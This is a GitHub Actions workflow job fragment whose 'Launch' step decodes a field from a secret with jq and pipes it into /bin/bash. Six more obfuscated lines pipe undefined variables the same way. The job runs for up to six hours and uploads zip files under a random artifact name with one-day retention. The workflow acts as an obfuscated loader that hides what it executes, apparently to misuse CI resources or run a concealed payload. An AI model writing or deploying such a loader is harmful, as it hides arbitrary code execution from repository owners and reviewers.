    runs-on: ubuntu-latest
    timeout-minutes: 360
    steps:
      - uses: actions/checkout@v4
      - name: Launch
        env:
          yps08: ${{ secrets.yps08 }}
        run: |
          printf '%s' "$yps08" | jq -r .fb7901 | /bin/bash
          echo $t67 | jq -r .rbe085 | /bin/bash
          printf '%s' "$c525" | jq -r .q9 | /bin/bash
          printf '%s' "$x147" | jq -r .qjt65 | /bin/bash
          echo $dxe5927 | jq -r .wir780 | /bin/bash
          echo $gww61 | jq -r .me38578 | /bin/bash
          printf '%s' "$nkdos13" | jq -r .dg7 | /bin/bash

      - name: Save artifact
        uses: actions/upload-artifact@v4
        with:
          name: fYxLiuQB
          path: "*.zip"
          retention-days: 1
